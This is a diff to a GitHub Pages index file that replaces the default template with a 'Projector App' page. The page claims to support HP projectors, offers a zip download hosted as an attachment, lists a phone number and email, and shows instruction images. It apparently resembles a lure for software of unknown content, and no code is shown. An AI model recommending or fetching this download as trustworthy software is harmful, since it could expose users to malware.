@@ -1,37 +1,21 @@
-## Welcome to GitHub Pages
+# Projector App
+## Contact Info: +79995908212, jqnighegorodovaa3716f02@gmail.com
+This Application for HP VP6321 Smart, HP SB21-DLP 1000, HP SB21 DLP and other projectors.
 
-You can use the [editor on GitHub](https://github.com/jqnighegorodovaa3716f02/Projector-App/edit/gh-pages/index.md) to maintain and preview the content for your website in Markdown files.
+[Download] (https://github.com/jqnighegorodovaa3716f02/Projector-App/files/7729034/projectorapp.zip) application
 
-Whenever you commit to this repository, GitHub Pages will run [Jekyll](https://jekyllrb.com/) to rebuild the pages in your site, from the content in your Markdown files.
+![1a1a](https://user-images.githubusercontent.com/95763314/146413852-953aad97-5e78-4781-912f-220f9dd362db.jpg)
 
-### Markdown
+![2b2b](https://user-images.githubusercontent.com/95763314/146413889-c157de43-2b8c-444f-9b52-c6e1674fb6bc.jpg)
 
-Markdown is a lightweight and easy-to-use syntax for styling your writing. It includes conventions for
+![c3c3](https://user-images.githubusercontent.com/95763314/146413909-8fa4b19a-5656-4af1-89e8-99691fb28b17.jpg)
 
-```markdown
-Syntax highlighted code block
+![4d4d](https://user-images.githubusercontent.com/95763314/146413943-b5695180-e3ed-482d-b859-e75a1404ece6.jpg)
 
-# Header 1
-## Header 2
-### Header 3
+![5e5e](https://user-images.githubusercontent.com/95763314/146413953-f567f224-93ee-4dc9-831e-308d9abcf0e7.jpg)
 
-- Bulleted
-- List
+# Instruction
 
-1. Numbered
-2. List
+![6](https://user-images.githubusercontent.com/90288327/144952128-4dc8e4e9-4725-4aa0-89f3-d0c60c827d97.png)
 
-**Bold** and _Italic_ and `Code` text
-
-[Link](url) and ![Image](src)
-```
-
-For more details see [Basic writing and formatting syntax](https://docs.github.com/en/github/writing-on-github/getting-started-with-writing-and-formatting-on-github/basic-writing-and-formatting-syntax).
-
-### Jekyll Themes
-
-Your Pages site will use the layout and styles from the Jekyll theme you have selected in your [repository settings](https://github.com/jqnighegorodovaa3716f02/Projector-App/settings/pages). The name of this theme is saved in the Jekyll `_config.yml` configuration file.
-
-### Support or Contact
-
-Having trouble with Pages? Check out our [documentation](https://docs.github.com/categories/github-pages-basics/) or [contact support](https://support.github.com/contact) and we’ll help you sort it out.
+![7](https://user-images.githubusercontent.com/90288327/144952132-73ab29c0-ad5b-42a3-8d14-13ec78d8666c.png)
